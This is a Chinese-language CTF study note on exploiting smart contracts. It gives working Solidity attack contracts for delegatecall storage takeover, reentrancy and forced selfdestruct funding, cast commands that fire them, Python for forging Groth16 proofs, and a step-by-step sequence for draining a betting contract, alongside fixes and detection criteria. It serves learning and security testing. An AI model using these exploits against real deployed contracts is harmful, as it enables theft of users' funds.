---

phase: webapp
vuln_class: [web3, smart-contract, delegatecall, reentrancy]
title: 智能合约与 Web3 挑战
summary: 链上题的攻击面只有三类：合约的访问控制、存储布局与代码语义的错位、以及 ABI/编译器层面的编码差异。按「谁在替谁执行」定位。
---

# 智能合约与 Web3 挑战

链下的钱包签名、OAuth、CI 凭证链见 [[web/漏洞分类/认证与会话/联邦认证与身份基础设施攻击.md|auth-infra]]；反序列化与类型混淆的通用原语见 [[web/漏洞分类/注入类/服务端高级技巧.md|server-side-advanced]]。

## 0. 判据速查

链上题里「密码学被攻破」极少见，被攻破的是**执行上下文**和**编码约定**。

| 现象 | 说明 | 去哪节 |
|---|---|---|
| 有 `setGovernance` / `setImplementation` / `upgrade` | 先查有没有权限控制 | §2 |
| 有 `delegatecall` | 存储上下文是调用者的，不是被调者的 | §2 |
| 调用返回空的 revert data（`"0x"`） | ABI coder v2 的地址校验失败 | §3 |
| 合约比对 codehash | 可能剥掉 CBOR metadata 后比 | §4 |
| 要求 `msg.data.length` 恰好等于某值 | 找字段重叠编码 | §5 |
| `withdraw` 里先转账后改余额 | 重入 | §8 |
| 验证器用 Groth16 | 查 `vk_delta_2 == vk_gamma_2`、查 nullifier 是否记账 | §6 |
| 预测市场 / 投注合约 | 查能否对不存在的 market 下注 | §7 |
| `--via-ir` 编译 + `delete` 瞬时存储变量 | Solidity 0.8.28–0.8.33 编译器 bug | §9 |
| 目标反复调用你的 `view` 函数并期望不同返回 | gas 冷热读侧信道（`view` 不等于确定性） | §10.1 |

## 1. 挑战环境与交互骨架

标准 CTF 链上题的四段式：

```text
1. 认证   GET /api/auth/nonce → personal_sign 签名 → POST /api/auth/login
2. 建实例 调用 factory.createInstance()（需测试网 ETH）
3. 攻击   与已部署的实例合约交互
4. 验证   GET /api/challenges/check-solution → isSolved() 为真则返回 flag
```

```python
from eth_account import Account
from eth_account.messages import encode_defunct
import requests

acct = Account.from_key(PRIVATE_KEY)
s = requests.Session()

nonce = s.get(f'{BASE}/api/auth/nonce').json()['nonce']
sig = acct.sign_message(encode_defunct(text=nonce))
r = s.post(f'{BASE}/api/auth/login', json={
    'signedNonce': '0x' + sig.signature.hex(),
    'nonce': nonce,
    'account': acct.address.lower(),   # 大小写见下
})
s.cookies.set('token', r.json()['token'])
```

要点：

- **地址大小写是高频坑**。有的服务端要全小写，有的要 EIP-55 校验和格式。**去读 `bundle.js` / 前端 JS 确认**，别猜 —— 报「invalid signature」九成是这个。
- `bundle.js` 里通常直接写着 chain ID、合约地址、认证流程，比逆向合约省事。
- 链上交互统一用 Foundry 的 `cast`：`cast call`（读）、`cast send`（写）、`cast storage`（读原始 slot）、`forge create`（部署）。
- 测试网 ETH 从 Google Cloud faucet / Alchemy / QuickNode 领。

## 2. delegatecall 与存储上下文

**核心事实**：`delegatecall` 执行被调者的**代码**，但读写的是**调用者的存储**。`address(this)` 也是调用者（通常是 proxy）。

所以只要能让合约 delegatecall 到攻击者写的代码，就能任意改写调用者的 storage —— 包括 owner、paused、implementation。

### 2.1 无权限控制的治理/升级函数

```solidity
// 目标合约
contract Vault {
    bool    public paused;      // slot 0（与 fee 打包）
    uint248 public fee;         // slot 0
    address public admin;       // slot 1
    address public governance;  // slot 2

    function setGovernance(address g) external {   // 没有 onlyOwner
        governance = g;
    }

    function execute(bytes calldata data) external {
        (bool ok,) = governance.delegatecall(data);  // 在 Vault 的存储上执行
        require(ok);
    }
}
```

```solidity
// 攻击合约：存储布局必须与 Vault 逐槽对齐
contract Attacker {
    bool    public paused;      // slot 0
    uint248 public fee;         // slot 0
    address public admin;       // slot 1
    address public governance;  // slot 2

    function attack(address _newAdmin) public {
        paused = false;         // 写的是 Vault 的 slot 0
        admin  = _newAdmin;     // 写的是 Vault 的 slot 1
    }
}
```

```bash
forge create Attacker.sol:Attacker --rpc-url $RPC --private-key $KEY
cast send $VAULT "setGovernance(address)" $ATTACKER --rpc-url $RPC --private-key $KEY
cast send $VAULT "execute(bytes)" $(cast calldata "attack(address)" $PLAYER) --rpc-url $RPC --private-key $KEY
cast send $VAULT "withdraw()" --rpc-url $RPC --private-key $KEY
```

要点：

- **布局必须逐槽对齐**，包括打包规则。`bool + uint248` 共用 slot 0；写成 `bool` 然后 `uint248` 也一样，但中间插一个 `uint256` 就全错位。
- 用 `cast storage $VAULT <n>` 逐槽读出实际值来验证对齐，别靠读源码推断。
- 检查清单：`setGovernance`、`setImplementation`、`upgradeTo`、`upgradeToAndCall`、`initialize`（可被二次调用）、`setAdmin`。

### 2.2 EIP-1967 代理的固定槽位

透明代理和 UUPS 都把实现地址放在固定槽，不占普通 storage 布局：

```text
implementation: keccak256("eip1967.proxy.implementation") - 1
                = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
admin:          keccak256("eip1967.proxy.admin") - 1
                = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103
beacon:         keccak256("eip1967.proxy.beacon") - 1
                = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50
```

```bash
cast storage $PROXY 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
cast storage $PROXY 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103
```

拿到实现地址就能 `cast call $IMPL --abi` 读源码逻辑，或直接 `cast send` 打实现合约（有时实现本身没有保护）。

## 3. ABI coder v1 vs v2：脏地址绕过

Solidity 0.8.x 默认 `abicoder v2`，会校验 `address` 参数的**高 12 字节必须为零**，否则直接 revert。而 `pragma abicoder v1` 不校验。

**判据**：调用 revert 且 `revert data` 是空的 `"0x"` —— v2 的校验失败不返回错误消息。

```text
# 攻击路径（当合约确实需要"脏地址"时）
1. 目标合约用 address 类型接收，但业务逻辑依赖高位字节
2. v2 编译的实现会拒掉 → 换一份用 pragma abicoder v1 编译的同源实现
3. 通过 proxy 的 upgrade 函数把实现换掉
4. 此时脏地址能通过解码
```

反向用法：如果目标校验了 `address` 却用 `assembly` 直接读 calldata，脏位就是绕过白名单的口子。

## 4. codehash 比对：剥掉 CBOR metadata

合约里常见的白名单是 `keccak256(code) == ALLOWED`。但 solc 在字节码**末尾**追加 CBOR 编码的 metadata（含源码 hash、编译器版本），改一个空格就变。

```python
code = bytes.fromhex(bytecode[2:])          # 去掉 0x
meta_len = int.from_bytes(code[-2:], 'big') # 最后 2 字节是 metadata 长度
stripped = code[:len(code) - meta_len - 2]  # 剥掉 metadata + 长度字段
codehash = keccak256(stripped)
```

要点：

- **`-2` 不能漏**：长度字段本身也在这 2 字节里。
- 若目标比对的是**完整**字节码，那就要构造字节完全一致但语义不同的合约 —— 更难，通常靠 `immutable` 变量（部署时写入 runtime code）来达成。
- 反过来，如果目标只比对 metadata 之前的部分，任何改动逻辑但保持前缀一致的手法都可行。

## 5. 非标准 calldata 编码

目标要求 `msg.data.length == 100`，但函数签名是 `(address, bytes)` 时，标准编码是 132 字节：

```text
标准：(address, bytes) 各占 32 字节头 + bytes 的内容
4 + 32(addr) + 32(offset=0x40) + 32(len) + 32(data) = 132

构造：让 offset 与 len 是同一个字段
4 + 32(dirty_addr) + 32(0x20) + 32(sigil) = 100
                     ↑ 既是 offset 又是 length
```

`0x20` 同时充当「bytes 数据相对 calldata 起点的偏移」和「bytes 的长度」。解码器读到 offset=0x20 指向的位置，正好是存放长度的那个槽，于是把后面的 32 字节当数据。

同类技巧：

- `bytes32` 存短字符串是**左对齐补零**：`bytes32("0xAnan or Tensai?")` = `0x3078416e616e206f722054656e7361693f000...`
- 动态数组长度字段被覆写成极大值 → 越界读后续 calldata
- `uint8` 参数只校验低 8 位，高位脏数据在 assembly 里可见

## 6. Groth16 证明伪造

ZK 验证器的实现缺陷比密码学缺陷常见得多。两个高频点：

### 6.1 trusted setup 退化（`delta == gamma`）

```python
from py_ecc.bn128 import G1, G2, multiply, add, neg

# 当 vk_delta_2 == vk_gamma_2 时，任意公开输入都能验过：
forged_A = vk_alpha1
forged_B = vk_beta2
forged_C = neg(vk_x)      # 把公开输入累加子取反抵消
```

原理：验证等式里 `delta` 和 `gamma` 的配对项相同时，两边可以互相抵消，剩下的等式与公开输入无关。

### 6.2 nullifier 未记账 → 证明重放

验证器合约不记录已用过的 `proposalNullifierHash`，同一份合法证明可以反复提交。

**去哪里找合法证明**：合约的**部署交易**（setup 阶段通常先跑一次合法证明）、测试脚本、公开的 calldata 历史。用 `cast tx <hash>` 或区块浏览器直接捞。

检查顺序：

1. `vk_delta_2 == vk_gamma_2` ？ → 直接伪造
2. 验证器有没有 `usedProofs` / `nullifierHash` 的 mapping ？ → 没有就重放
3. 公开输入是否绑定到 `msg.sender` / `block.chainid` ？ → 没绑定就能跨场景复用

## 7. 预测市场与投注合约

三个可叠加的缺陷，组合起来能精确抽干资金。

### 7.1 幽灵市场下注

```solidity
function bet(uint256 market, bool yes) external payable {
    require(marketResolution[market] == 0, "resolved");   // 只查了未结算
    // 缺 require(market < nextMarketIndex) —— 市场根本不存在也能下注
}
```

`marketResolution` 是 mapping，不存在的 key 默认读 0，所以「未结算」恒成立。

### 7.2 unresolve 时状态未清

```solidity
function createMarket(...) external {
    marketResolution[nextMarketIndex] = 0;   // 覆盖了幽灵市场原来的 0
    nextMarketIndex++;
    // 但 totalYesBet / totalNoBet 没清零
}
```

同一个 market ID 被「创建」后，`totalYesBet` 还是之前下注的累计值，赔率计算被污染。

### 7.3 强制打款（selfdestruct）

合约没有 `receive()` 也能收 ETH：

```solidity
contract ForceSend {
    constructor(address payable target) payable {
        selfdestruct(target);    // EIP-6780 之后仍能在构造函数里转 ETH
    }
}
// new ForceSend{value: amount}(dao)
```

**EIP-6780 的变化**：`selfdestruct` 不再删除合约（除非在同一交易里创建），但**转账行为保留**。所以「强制打款」这一招在新链上仍然有效。

### 7.4 完整的抽干循环

```text
目标：market 里原本有 mBal，另有 1 wei 属于 helper

1. ForceSend 往 DAO 强制打入 2*mBal
2. Helper1 用 1 wei 对幽灵市场 N 下 NO
3. DAO 通过治理提案下注 2*mBal 到 YES（delegatecall 执行）
4. 结算 NO → Helper1 取款（此时 totalYesBet 仍是 2*mBal）
5. createMarket() 走到 N → marketResolution[N] 被写成 0（unresolve）
6. Helper2 用 1 wei 下 NO → 结算 NO → 取款
```

赔率：`payout = bet + bet * totalYesBet / totalNoBet = 1 + 1 * 2*mBal / 2 = 1 + mBal`。
市场原有 `mBal + 1`，付出去 `1 + mBal`，余额归零。

**坑**：

- **EVM 的 `.call` 余额不足是静默失败**（返回 false，不 revert）。下注金额必须算准，让 `payout ≤ market balance`，否则转账不生效但状态已改。
- **ethers.js 的 BigInt 比较**必须写 `!== 0n`，写 `!== 0` 永远为真（类型不同）。
- 结算前的 `totalYesBet / totalNoBet` 是**整数除法**，分母为 0 时整个表达式 revert。

**检查清单**：能否对 `>= nextMarketIndex` 的 ID 下注？创建市场时是否重置了 bet 累计？能否用 selfdestruct 强灌余额？

## 8. 重入

`withdraw` 先转账后清零，攻击合约的 `receive()` 递归调用：

```solidity
// 有漏洞
function withdraw() public {
    uint amount = balances[msg.sender];
    require(amount > 0);
    (bool ok,) = msg.sender.call{value: amount}("");   // 先转
    require(ok);
    balances[msg.sender] = 0;                          // 太晚
}
```

```solidity
contract Attacker {
    VulnerableBank public target;
    uint public count;

    constructor(address _t) { target = VulnerableBank(_t); }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (count < 10 && address(target).balance >= msg.value) {
            count++;
            target.withdraw();     // 余额还没清零，再取一次
        }
    }
}
```

```bash
cast send $ATTACKER "attack()" --value 1ether --rpc-url $RPC --private-key $KEY
```

三种修法（也是三种「目标合约是否安全」的判据）：

```solidity
// ① Checks-Effects-Interactions：先改状态再外部调用
balances[msg.sender] = 0;
(bool ok,) = msg.sender.call{value: amount}("");

// ② transfer()：gas 上限 2300，不够重入
payable(msg.sender).transfer(amount);

// ③ ReentrancyGuard：非重入锁
```

**变体**：跨函数重入（A 函数的状态被 B 函数读）、跨合约重入（只读视图函数被污染）、ERC-777 的 `tokensToSend` 回调。判据统一是「外部调用发生时，有没有状态还没落到最终值」。

## 8.1 DeFi 比例凑单（`minAmount` 传 0）

这是 DeFi 题里最高频的洞，比价格操纵简单得多。判据是**`addLiquidity` 是否校验最小份额**——`amountAMin`/`amountBMin` 传 0 时不检查滑点，任何调用点没传 min 就是洞。

```text
Uniswap V2 的 addLiquidity 按「当前储备比例」计算份额
如果合约里两种代币的比例恰好等于 pair 的比例
→ 一次性把全部余额按比例入池，攻击者拿走全部 LP
```

打法四步：

```text
1. 先 swap 出中间代币（让合约内两种代币比例接近 pair 比例）
2. 再用中间代币换 pair 里的第二种代币
3. 调 addLiquidity，min 传 0
4. 拿走 LP，撤池
```

**价格操纵**是另一类：判据是**价格源是「即时余额」而不是「TWAP/预言机」**——`price = balanceOf(pair)` 或 `getReserves()` 可被闪电贷借大量 token → swap 压低/拉高储备 → 触发业务 → 归还。用 Chainlink 或时间加权的不受此影响。

## 8.2 Solidity 语义判据表

| 判据 | 说明 |
|---|---|
| `transfer` 返回值未检查（< 0.8.0） | 假充值：token 转账失败但余额已加 |
| `abi.encodePacked` 多动态类型 | 哈希碰撞（`encodePacked("a","bc") == encodePacked("ab","c")`） |
| `MerkleProof` 未校验 index | `proofs[i]` 错配 + `index[i]=i` 可绕；`usedLeafs` mapping 缺失则空投可重放 |
| `tx.origin` 用于鉴权 | 钓鱼可绕 |
| `selfdestruct` 强制转账 | 可污染 `address(this).balance` |
| `delegatecall` 到可控地址 | 直接拿存储写权限（见 §2） |

**Move / Sui 差异**：资源（resource）是 first-class 类型，不能复制、不能隐式丢弃；转账必须显式 `transfer::public_transfer`。判据是**函数有没有 `entry` 修饰**——没有的话必须写 `script` 块调用。

## 9. 编译器 bug：瞬时存储清理函数撞名（0.8.28–0.8.33）

**影响**：Solidity 0.8.28 – 0.8.33，仅 `--via-ir` 编译，0.8.34 修复。

**根因**：IR 流水线为 `delete` 生成 Yul 辅助函数，函数名由**值类型**派生，但**漏掉了存储位置**（persistent vs transient）。当同一编译单元里对「同类型的持久变量」和「瞬时变量」都做 `delete`，两者生成同名辅助函数 —— 先编译的那个胜出，另一个用错 opcode（`sstore` 写成 `tstore`，或反之）。

```solidity
contract Vulnerable {
    address public owner;                    // 持久，slot 0
    mapping(uint256 => address) public m;    // 持久
    address transient _lock;                 // 瞬时

    function guarded() external {
        require(_lock == address(0), "locked");
        _lock = msg.sender;
        delete _lock;   // BUG：走成 sstore，把 slot 0 的 owner 清零
    }
}
```

两个利用方向：

1. **瞬时 `delete` 走了 `sstore`** → 覆盖持久存储（slot 0 常是 owner / 权限变量），同时瞬时变量没被清掉，重入锁失效
2. **持久 `delete` 走了 `tstore`** → 授权、mapping 无法撤销（交易结束瞬时存储自动丢弃）

**跨类型碰撞**：数组的 `.pop()`、`delete arr`、缩短操作按 slot 粒度用 `uint256` 辅助函数清理 —— 一个 `bool[]` 的清理会和 `delete uint256 transient _temp` 撞名。

**判据**：

```bash
solc --via-ir --ir Contract.sol > yul.txt
grep -c "storage_set_to_zero\|transient_storage_set_to_zero" yul.txt
# 0.8.34 会把两族函数名区分开，旧版本则混用
```

**规避**：把 `delete _lock` 改成 `_lock = address(0)` —— 直接赋零走正确的 opcode 路径。

**关键**：三个条件必须同时满足（`--via-ir` + 对瞬时变量 `delete` + 同单元有同类型的持久 `delete`），编译器**不给任何警告**，且错误的存储操作**不会 revert**，是静默破坏状态。

## 10. 通用技巧

- **Factory 模式**：每个玩家一个实例。先找 `playerToInstance(address)` mapping 确认自己的实例地址。
- **Proxy 的 fallback**：所有不认识的调用都 delegatecall 到实现。所以 `cast call $PROXY "任意签名"` 实际打在实现上。
- **升级函数先查权限**：大量题就是留了 `upgradeTo` 没加 `onlyOwner`。
- **`address(this)` 在 delegatecall 里是 proxy**，不是实现 —— 判断「代码里记录的地址到底是谁」时必看。
- **mapping 的存储位置**：`keccak256(abi.encode(key, slot))`，手工读 mapping 值时按这个算。
- **空 revert data（`0x`）** 基本等于 ABI 解码校验失败。
- **合约 nonce 从 1 开始**。nonce = 1 表示还没创建过子合约。
- **推导子合约地址**：`keccak256(rlp.encode([parent, nonce]))[-20:]`。
- **读源码**：`cast interface $ADDR` 拿 ABI，区块浏览器验证过的源码直接看 —— 比反编译省事。

### 10.1 `view` 函数不是「无副作用」：gas 侧信道

`view`/`pure` 只保证不写状态，**不保证行为与调用次数无关**。EVM 里「读同一地址第二次更便宜」是硬规则，可以被观测：

| 访问类型 | gas |
|---|---|
| 冷读（该地址本笔交易首次访问） | 2600 |
| 暖读（同交易内再次访问） | 100 |
| `SLOAD` 冷 / 暖 | 2100 / 100 |

这套冷热计价由 **EIP-2929**（柏林升级）引入，**EIP-3529**（伦敦升级）又下调了 `SSTORE` 退款额——所以按 gas 差判状态的题要先确认链的 fork 版本，不同版本数值不同。

所以 `view` 函数里 `gasleft()` 的差值能反映「这是第几次被调」，从而返回不同值：

```solidity
function wish_amount() external view returns (uint256) {
    uint256 startGas = gasleft();
    uint256 bal = address(0x100).balance;      // 首次=冷读2600，之后=暖读100
    uint256 usedGas = startGas - gasleft();
    return usedGas < 1000 ? 2 : 0;              // 第二次调用返回 2
}
```

判据：**目标合约把「你返回的值」连续调用两次并期望不同结果**（先判 `< 1` 再判 `> 1` 这类），就是这个模式。`view` 无法改存储，但 gas 消耗是天然的可变状态。

同族手法：`gasleft() % 2`（交替返回）、按 `block.number`/`block.timestamp` 返回不同值、按 `tx.origin == msg.sender` 区分调用来源。

**纪律**：看到 `view`/`pure` 函数被目标合约反复调用，先读它的函数体有没有 `gasleft()`、`block.*`、`tx.*`、`address(...).balance`——这四样是 `view` 里唯一能变的输入。

## 11. 纪律

- **先找无权限控制的状态写函数**，再谈密码学。90% 的链上题死在这里，不在 ZK 或 ECDSA 上。
- **delegatecall 题的胜负手是存储布局对齐**。用 `cast storage` 逐槽验证，不要凭源码推断打包。
- **ABI 层的题先看 revert data**。空的 `0x` 是 v2 校验失败，不是业务逻辑拒绝。
- **codehash 比对先问「剥不剥 metadata」**。剥了就能改逻辑，不剥就得靠 immutable。
- **ZK 题先比 `vk_delta_2` 和 `vk_gamma_2`**，再看 nullifier 记账。这两步能解决绝大多数。
- **涉及金额计算，先确认整数除法和静默失败**。EVM 的 `.call` 余额不足不 revert，是最常见的「明明算对了却没钱」。
- **编译器 bug 题只在题目明确给了 solc 版本和 `--via-ir` 时才考虑**，否则是浪费时间。
- **`view` 函数不等于确定性函数**。目标反复调同一个 `view` 并期望不同返回值时，查 `gasleft()` / `block.*` / `tx.*` / `balance` 这四类可变输入（见 §10.1）。
